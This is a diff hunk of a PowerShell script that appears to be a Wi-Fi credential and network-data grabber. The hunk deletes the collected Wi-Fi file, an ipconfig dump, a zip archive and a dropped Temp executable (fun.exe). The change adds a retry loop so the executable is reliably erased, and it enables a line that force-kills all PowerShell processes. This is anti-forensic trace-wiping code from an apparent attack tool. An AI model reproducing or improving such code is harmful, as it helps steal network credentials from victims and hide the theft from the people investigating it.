@@ -54,8 +54,13 @@ Start-Sleep -Seconds 3
 Remove-Item -Path "$wifiFile" -Force
 Remove-Item -Path "$e\ipcfg.txt" -Force
 Remove-Item -Path "$zip" -Force
-Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force
+
+while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
+    try { Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop } catch {}   
+    Start-Sleep -Seconds 1
+}
+
 
 
 #exit quickly
-#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
+taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
